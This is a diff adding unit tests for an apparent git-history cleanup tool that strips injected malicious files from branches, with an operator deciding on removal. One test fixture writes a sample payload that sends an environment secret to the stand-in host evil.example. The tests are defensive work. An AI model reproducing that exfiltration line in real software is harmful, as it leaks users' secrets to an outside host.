@@ -1624,6 +1624,16 @@ class TestAmendActsOnContentPayload(_AmendFixture):
         self.assertEqual(by_name["iso"].reason.cause, Cause.COMMIT_SHAPE_NOT_MODELLED)
         self.assertTrue(outcome.needs_review)
 
+    def test_the_operator_can_deliver_an_unmodellable_branch_by_removing_its_files(self):
+        """The branch that isolates on an un-modellable commit is delivered instead when the operator
+        removes that commit's injected files."""
+        _iso, findings = self._deliverable_beside_an_uncharacterizable_commit()
+        outcome = self._run_with_findings(findings, resolver=lambda item: Decision(remove=True))
+        by_name = {b.name: b for b in outcome.branches}
+        self.assertTrue(by_name["iso"].force_updated,
+                        "the operator removed the injected files and iso was delivered")
+        self.assertFalse(self._present("iso:evil/b.js"), "the injected file is gone from iso")
+
     def test_the_operator_can_remove_an_uncertain_file(self):
         """A heuristic (uncertain) file the verb would leave alone is put to an injected resolver;
         when it answers remove, the file is dropped from history alongside the confirmed cleanup."""
@@ -1712,6 +1722,26 @@ class TestAmendActsOnContentPayload(_AmendFixture):
         self.assertTrue(outcome.completed, self._causes(outcome))
         self.assertTrue(self._present(f"{self.base}:suspect.bin"),
                         "a resolver fault leaves the uncertain file in place")
+
+    def _unhandled_confirmed_file(self):
+        self.write(self.d, "steal.js", "fetch('https://evil.example/'+process.env.SECRET)\n")
+        self.commit(self.d, "add a confirmed payload saw cannot auto-clean")
+        return [Finding("exfil-secret", "exfil", Severity.CRITICAL, "steal.js",
+                        "exfiltrates an env secret", confidence=CONFIRMED)]
+
+    def test_the_operator_can_remove_a_confirmed_file_saw_could_not_auto_clean(self):
+        """A confirmed payload with no automatic remediation (would be needs-manual-recovery) is
+        removed when the operator says so, instead of the run refusing."""
+        outcome = self._run_with_findings(self._unhandled_confirmed_file(),
+                                          resolver=lambda item: Decision(remove=True))
+        self.assertTrue(outcome.completed, self._causes(outcome))
+        self.assertFalse(self._present(f"{self.base}:steal.js"), "the operator-removed file is gone")
+
+    def test_an_unhandled_confirmed_file_without_a_resolver_still_needs_manual_recovery(self):
+        outcome = self._run_with_findings(self._unhandled_confirmed_file(), resolver=None)
+        self.assertFalse(outcome.completed)
+        self.assertIn(Cause.PAYLOAD_NEEDS_MANUAL_RECOVERY, self._causes(outcome))
+        self.assertTrue(self._present(f"{self.base}:steal.js"))
 
     def test_the_payload_check_recreates_a_symlink_from_its_blob_not_as_text(self):
         """A write-redirect symlink is a git mode-120000 blob holding the target string. Read back as
